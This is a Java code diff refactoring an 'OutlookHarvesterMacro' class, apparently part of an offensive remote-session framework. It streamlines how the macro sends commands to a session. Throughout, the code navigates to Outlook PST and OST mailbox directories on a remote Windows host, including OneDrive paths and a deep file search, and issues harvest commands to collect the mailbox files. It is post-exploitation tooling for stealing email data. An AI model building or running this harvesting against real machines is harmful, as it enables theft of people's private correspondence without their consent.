@@ -22,18 +22,9 @@ public class OutlookHarvesterMacro extends AbstractCommandMacro {
 	public static String OUTLOOK_PST_DIR = "%USERPROFILE%\\Documents\\Outlook Files";
 	public static String OUTLOOK_PST_ONEDRIVE_DIR = "%USERPROFILE%\\OneDrive\\Documents\\Outlook Files";
 
-	private HarvestProcessor harvestProcessor;
-	private IOManager io;
-
 	@Override
 	public boolean isCommandMatch(String cmd) {
 		return cmd.startsWith(OUTLOOK_HARVEST_COMMAND);
-	}
-
-	@Override
-	public void initialize(IOManager io, HarvestProcessor harvestProcessor) {
-		this.io = io;
-		this.harvestProcessor = harvestProcessor;
 	}
 
 	@Override
@@ -57,27 +48,21 @@ public class OutlookHarvesterMacro extends AbstractCommandMacro {
 					outcome.addError("Cannot resolve APPDATA and USERPROFILE");
 					return outcome;
 				}
-				io.sendCommand(sessionId, Commands.PWD);
-				outcome.addSentCommand(Commands.PWD);
-				String response = io.awaitMultilineCommands(sessionId);
+				sendCommand(Commands.PWD, sessionId, outcome);
+				String response = awaitResponse(sessionId, outcome);
 				if (!response.equals("")) {
-					outcome.addResponseIo(response);
 					outcome.addMacroMessage("Saving original working directory, proceeding with Outlook harvest");
 					String originalDirectory = response.replace(System.lineSeparator(), "");
 					String expectedPSTDir = OUTLOOK_PST_DIR.replace("%USERPROFILE%", userProfile);
-					outcome.addSentCommand(Commands.CD + " " + expectedPSTDir);
-					io.sendCommand(sessionId, Commands.CD + " " + expectedPSTDir);
-					response = io.awaitMultilineCommands(sessionId);
-					outcome.addResponseIo(response);
+					sendCommand(Commands.CD + " " + expectedPSTDir, sessionId, outcome);
+					response = awaitResponse(sessionId, outcome);
 					response = response.replace(System.lineSeparator(), "");
 					boolean foundPSTDir = false;
 					if (!response.equals(expectedPSTDir)) {
 						outcome.addMacroMessage("Attempting OneDrive dir");
 						expectedPSTDir = OUTLOOK_PST_ONEDRIVE_DIR.replace("%USERPROFILE%", userProfile);
-						outcome.addSentCommand(Commands.CD + " " + expectedPSTDir);
-						io.sendCommand(sessionId, Commands.CD + " " + expectedPSTDir);
-						response = io.awaitMultilineCommands(sessionId);
-						outcome.addResponseIo(response);
+						sendCommand(Commands.CD + " " + expectedPSTDir, sessionId, outcome);
+						response = awaitResponse(sessionId, outcome);
 						response = response.replace(System.lineSeparator(), "");
 						if (!response.equals(expectedPSTDir)) {
 							outcome.addError("Unable to switch to OST default directory for harvest");
@@ -89,10 +74,8 @@ public class OutlookHarvesterMacro extends AbstractCommandMacro {
 					}
 
 					if (foundPSTDir) {
-						io.sendCommand(sessionId, Commands.HARVEST_CURRENT_DIRECTORY);
-						outcome.addSentCommand(Commands.HARVEST_CURRENT_DIRECTORY);
-						response = io.awaitMultilineCommands(sessionId);
-						outcome.addResponseIo(response);
+						sendCommand(Commands.HARVEST_CURRENT_DIRECTORY, sessionId, outcome);
+						response = awaitResponse(sessionId, outcome);
 					}
 
 					String expectedOSTDir;
@@ -101,32 +84,24 @@ public class OutlookHarvesterMacro extends AbstractCommandMacro {
 					} else {
 						expectedOSTDir = OUTLOOK_OST_DIR.replace("%APPDATA%", appdata);
 					}
-					outcome.addSentCommand(Commands.CD + " " + expectedOSTDir);
-					io.sendCommand(sessionId, Commands.CD + " " + expectedOSTDir);
-					response = io.awaitMultilineCommands(sessionId);
+					sendCommand(Commands.CD + " " + expectedOSTDir, sessionId, outcome);
+					response = awaitResponse(sessionId, outcome);
 					if (response.contains("Harvest complete: ")) {
-						outcome.addResponseIo(response);
-						response = io.awaitMultilineCommands(sessionId);
+						response = awaitResponse(sessionId, outcome);
 					}
-					outcome.addResponseIo(response);
 					response = response.replace(System.lineSeparator(), "");
 					if (response.contains("Invalid directory traversal")) {
 						outcome.addError("Unable to switch to OST default directory for harvest");
 					} else {
-						io.sendCommand(sessionId, Commands.HARVEST_CURRENT_DIRECTORY);
-						outcome.addSentCommand(Commands.HARVEST_CURRENT_DIRECTORY);
-						response = io.awaitMultilineCommands(sessionId);
-						outcome.addResponseIo(response);
+						sendCommand(Commands.HARVEST_CURRENT_DIRECTORY, sessionId, outcome);
+						response = awaitResponse(sessionId, outcome);
 					}
 
-					outcome.addSentCommand(Commands.CD + " " + originalDirectory);
-					io.sendCommand(sessionId, Commands.CD + " " + originalDirectory);
+					sendCommand(Commands.CD + " " + originalDirectory, sessionId, outcome);
 					if (response.contains("Harvest complete: ")) {
-						outcome.addResponseIo(response);
-						response = io.awaitMultilineCommands(sessionId);
+						response = awaitResponse(sessionId, outcome);
 					}
-					response = io.awaitMultilineCommands(sessionId);
-					outcome.addResponseIo(response);
+					response = awaitResponse(sessionId, outcome);
 					response = response.replace(System.lineSeparator(), "");
 					if (!response.equals(originalDirectory)) {
 						outcome.addError("Unable to restore original working directory");
@@ -138,11 +113,9 @@ public class OutlookHarvesterMacro extends AbstractCommandMacro {
 					outcome.addError("Could not query for current working directory, aborting macro");
 				}
 			} else if (elements[1].equals(OUTLOOK_HARVEST_DEEP_SEARCH)) {
-				io.sendCommand(sessionId, Commands.PWD);
-				outcome.addSentCommand(Commands.PWD);
-				String response = io.awaitMultilineCommands(sessionId);
+				sendCommand(Commands.PWD, sessionId, outcome);
+				String response = awaitResponse(sessionId, outcome);
 				if (!response.equals("")) {
-					outcome.addResponseIo(response);
 					outcome.addMacroMessage("Saving original working directory, proceeding with Outlook harvest");
 					String originalDirectory = response.replace(System.lineSeparator(), "");
 					String findCmd = OUTLOOK_PST_FIND_DIR_CMD;
@@ -151,18 +124,16 @@ public class OutlookHarvesterMacro extends AbstractCommandMacro {
 					} else {
 						findCmd = findCmd.replace("$SEARCH_DIR$", OUTLOOK_PST_DEFAULT_SEARCH_DIR);
 					}
-					io.sendCommand(sessionId, findCmd);
-					outcome.addSentCommand(findCmd);
-					response = io.awaitMultilineCommands(sessionId, 30000);
+					sendCommand(findCmd, sessionId, outcome);
+					response = awaitResponse(sessionId, outcome, 30000);
 					if (!response.contains("Attempting search with 10 minute timeout")) {
 						outcome.addMacroMessage("Could not search for PST files");
 					} else {
 						if (!response.contains("Search complete")) {
-							response = io.awaitMultilineCommands(sessionId, 120000);
+							response = awaitResponse(sessionId, outcome, 120000);
 						}
 						if (!response.equals("") && !response.contains("Search complete with no findings")
 								&& !response.contains("Cannot execute command ")) {
-							outcome.addResponseIo(response);
 							for (String line : response.split(System.lineSeparator())) {
 								if (!line.equals("Attempting search with 10 minute timeout")
 										&& !line.equals("Search complete") && !line.equals("")) {// Discard final line
@@ -170,19 +141,15 @@ public class OutlookHarvesterMacro extends AbstractCommandMacro {
 									//Why not use Paths? Doesn't work cross-platform
 									String pathStr = line.substring(0, line.lastIndexOf("\\"));
 									String command = Commands.CD + " " + pathStr;
-									io.sendCommand(sessionId, command);
-									outcome.addSentCommand(command);
-									response = io.awaitMultilineCommands(sessionId);
+									sendCommand(command, sessionId, outcome);
+									response = awaitResponse(sessionId, outcome);
 									response = response.replace(System.lineSeparator(), "");
-									outcome.addResponseIo(response);
 
 									if (!response.equals(pathStr)) {
 										outcome.addError("Unable to switch to PST found directory for harvest");
 									} else {
-										io.sendCommand(sessionId, Commands.HARVEST_CURRENT_DIRECTORY);
-										outcome.addSentCommand(Commands.HARVEST_CURRENT_DIRECTORY);
-										response = io.awaitMultilineCommands(sessionId);
-										outcome.addResponseIo(response);
+										sendCommand(Commands.HARVEST_CURRENT_DIRECTORY, sessionId, outcome);
+										response = awaitResponse(sessionId, outcome);
 									}
 								}
 							}
@@ -191,11 +158,9 @@ public class OutlookHarvesterMacro extends AbstractCommandMacro {
 						}
 					}
 
-					io.sendCommand(sessionId, Commands.CD + " " + originalDirectory);
-					outcome.addSentCommand(Commands.CD + " " + originalDirectory);
-					response = io.awaitMultilineCommands(sessionId);
+					sendCommand(Commands.CD + " " + originalDirectory, sessionId, outcome);
+					response = awaitResponse(sessionId, outcome);
 					response = response.replace(System.lineSeparator(), "");
-					outcome.addResponseIo(response);
 					if (!response.equals(originalDirectory)) {
 						outcome.addError("Unable to switch to original directory for harvest");
 					} else {
